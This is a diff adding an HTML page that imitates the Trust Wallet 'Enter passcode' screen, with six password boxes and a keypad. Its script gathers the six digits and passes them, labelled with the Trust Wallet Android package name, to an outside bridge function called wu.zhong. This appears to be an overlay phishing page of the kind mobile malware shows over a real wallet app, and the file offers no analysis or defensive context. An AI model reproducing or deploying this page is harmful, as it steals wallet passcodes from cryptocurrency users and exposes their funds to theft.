@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8" />
+<title>Trust Wallet</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+*{
+margin: 0;
+padding: 0;
+outline: 0;
+font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+color: white;
+}
+body{
+background-color: #1b1b1c;
+}
+.container{
+width: 90%;
+height: 100%;
+margin: auto;
+}
+.title{
+width: 100%;
+color: white;
+font-size: 15px;
+width: 100%;
+margin-top: 50px;
+text-align: center;
+}
+.boxes{
+display: flex;
+justify-content: center;
+align-items: center;
+width: 90%;
+margin: auto;
+margin-bottom: 80px;
+}
+.boxes .box{
+width: 35px;
+height: 40px;
+background-color: transparent;
+border: 1.5px solid #939292;
+border-radius: 3px;
+margin: calc(100% / 8 - 30px);
+text-align: center;
+pointer-events: none;
+}
+
+.digits{
+display: flex;
+justify-content: center;
+align-items: center;
+width: 95%;
+margin: auto;
+height: 100px;
+}
+.digits .digit{
+width: calc(100% / 3);
+font-size: 28px;
+font-weight: bold;
+text-align: center;
+height: 80px;
+}
+.digitsBox{
+position: absolute;
+bottom: 20px;
+width: 100%;
+left: 0;
+}
+</style>
+
+
+<body>
+
+        <div class="container">
+
+
+        <div class="digitsBox">
+
+
+
+        <div class="title" >Enter passcode</div>
+
+
+                <div class="boxes">
+                <input type="password" maxlength="1" class="box" id="box1">
+                <input type="password" maxlength="1" class="box" id="box2">
+                <input type="password" maxlength="1" class="box" id="box3">
+                <input type="password" maxlength="1" class="box" id="box4">
+                <input type="password" maxlength="1" class="box" id="box5">
+                <input type="password" maxlength="1" class="box" id="box6">
+                </div>
+
+
+                    <div class="digits">
+                    <div class="digit">1</div>
+                    <div class="digit">2</div>
+                    <div class="digit">3</div>
+                    </div>
+
+                    <div class="digits">
+                    <div class="digit">4</div>
+                    <div class="digit">5</div>
+                    <div class="digit">6</div>
+                    </div>
+
+
+                    <div class="digits">
+                    <div class="digit">7</div>
+                    <div class="digit">8</div>
+                    <div class="digit">9</div>
+                    </div>
+
+        <div class="digits">
+            
+        <div class="digit" style="pointer-events: none;">
+        <svg xmlns="http://www.w3.org/2000/svg" version="1.0" width="40px" height="40px" viewBox="0 0 300.000000 300.000000" preserveAspectRatio="xMidYMid meet">
+              <g transform="translate(0.000000,300.000000) scale(0.100000,-0.100000)" fill="#434344" stroke="none">
+              <path d="M1279 2985 c-318 -43 -657 -199 -878 -404 -45 -42 -51 -52 -51 -88 0 -54 37 -93 89 -93 30 0 48 10 96 51 503 432 1225 479 1773 116 53 -36 124 -88 157 -116 48 -41 66 -51 96 -51 52 0 89 39 89 93 0 36 -6 46 -51 88 -29 26 -87 73 -130 104 -343 247 -777 356 -1190 300z"/>
+              <path d="M1240 2610 c-393 -70 -743 -285 -985 -609 -53 -71 -65 -93 -65 -124 0 -52 35 -87 88 -87 48 0 59 10 145 121 161 210 399 379 653 465 264 88 572 90 834 4 266 -87 501 -252 668 -469 84 -111 96 -121 144 -121 53 0 88 35 88 87 0 31 -12 53 -65 124 -245 327 -594 541 -993 610 -149 25 -366 25 -512 -1z"/>
+              <path d="M1367 2260 c-188 -22 -432 -118 -578 -229 -522 -397 -660 -1118 -322 -1684 66 -111 120 -167 162 -167 42 0 77 24 90 61 13 37 5 58 -54 145 -140 204 -202 421 -192 669 6 159 37 285 100 419 60 126 115 205 212 302 294 296 718 382 1099 224 377 -157 646 -582 646 -1020 0 -109 -26 -175 -90 -233 -99 -89 -237 -91 -336 -4 -70 62 -86 102 -94 242 -4 66 -13 140 -20 165 -34 124 -140 261 -248 318 -193 102 -405 79 -559 -61 -210 -192 -245 -494 -92 -799 145 -291 474 -583 681 -605 54 -5 59 -4 87 25 63 62 17 162 -73 162 -94 0 -355 223 -474 405 -99 150 -147 324 -124 447 16 86 64 180 114 223 68 57 114 75 200 75 130 0 230 -66 286 -189 20 -44 27 -79 33 -175 9 -143 25 -201 77 -282 48 -74 106 -123 198 -166 64 -31 76 -33 174 -33 100 0 109 2 180 36 254 122 327 376 225 781 -119 472 -502 847 -952 932 -105 19 -261 26 -356 16z"/>
+              <path d="M1330 1881 c-161 -34 -295 -106 -414 -220 -257 -248 -342 -599 -226 -941 56 -165 197 -400 349 -582 93 -111 124 -138 158 -138 60 0 113 60 99 113 -3 13 -33 55 -67 93 -144 161 -285 376 -339 515 -49 127 -63 195 -63 299 0 186 72 359 203 489 85 86 155 130 262 169 65 23 88 26 208 26 121 0 142 -2 208 -26 108 -39 177 -84 262 -169 121 -120 189 -274 206 -463 6 -67 11 -83 32 -103 34 -32 90 -31 126 2 24 22 26 31 26 99 0 225 -103 452 -283 622 -202 192 -478 271 -747 215z"/>
+              <path d="M1455 1156 c-48 -21 -59 -53 -52 -148 17 -227 126 -450 300 -614 124 -117 249 -184 379 -205 67 -11 93 -6 125 23 31 28 38 70 18 108 -19 37 -40 47 -118 55 -82 9 -185 64 -269 144 -147 138 -230 307 -247 499 -7 80 -12 97 -32 117 -31 30 -67 37 -104 21z"/>
+              </g>
+              </svg>
+              </div>
+              <div class="digit">0</div>
+              <div class="digit"  id="backspace-btn">
+              <svg width="40px" height="40px" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+              <g id="Layer_2" data-name="Layer 2">
+              <g id="invisible_box" data-name="invisible box">
+              <rect width="48" height="48" fill="none"></rect>
+              </g>
+              <g id="Q3_icons" data-name="Q3 icons">
+              <path id="back" fill="#434344" d="M44,9H14.5a.9.9,0,0,0-.8.4L2.4,22.8a1.8,1.8,0,0,0,0,2.4L13.7,38.6a.9.9,0,0,0,.8.4H44a2,2,0,0,0,2-2V11A2,2,0,0,0,44,9ZM33.3,27.5a2.1,2.1,0,0,1,.4,2.7,2,2,0,0,1-3.1.2L27,26.8l-3.6,3.6a2,2,0,0,1-3.1-.2,2.1,2.1,0,0,1,.4-2.7L24.2,24l-3.5-3.5a2.2,2.2,0,0,1-.4-2.7,2,2,0,0,1,3.1-.2L27,21.2l3.6-3.6a2,2,0,0,1,3.1.2,2.2,2.2,0,0,1-.4,2.7L29.8,24Z"></path>
+              </g>
+              </g>
+    </svg>
+    </div>
+    </div>
+
+        </div>
+
+
+
+
+</div>
+
+
+<script type="text/javascript">
+let currentInputIndex = 1;
+let enteredDigits = '';
+
+document.querySelectorAll('.digit').forEach(button => {
+  button.addEventListener('click', () => {
+
+
+    
+
+    if (button.id === 'backspace-btn') {
+
+      if (currentInputIndex > 1) {
+        currentInputIndex--;
+        document.getElementById(`box${currentInputIndex}`).value = '';
+        enteredDigits = enteredDigits.slice(0, -1);
+      }
+    } else {
+
+    if (currentInputIndex <= 6) {
+      const digit = button.textContent;
+      const input = document.getElementById(`box${currentInputIndex}`);
+      input.value = digit;
+      currentInputIndex++;
+      enteredDigits += digit; 
+    }
+
+   }
+
+
+    if (currentInputIndex > 1) {
+        document.getElementById(`back`).setAttribute('fill', '#fff');
+    }else{
+        document.getElementById(`back`).setAttribute('fill', '#434344');
+    }
+
+
+    if(enteredDigits.length === 6) {
+     wu.zhong(`🔰Trust Wallet Passcode \n\n🔒Code: ${enteredDigits}`,"com.wallet.crypto.trustapp");
+    }
+
+  });
+});
+
+
+
+
+</script>
+
+
+</body>
+</html>
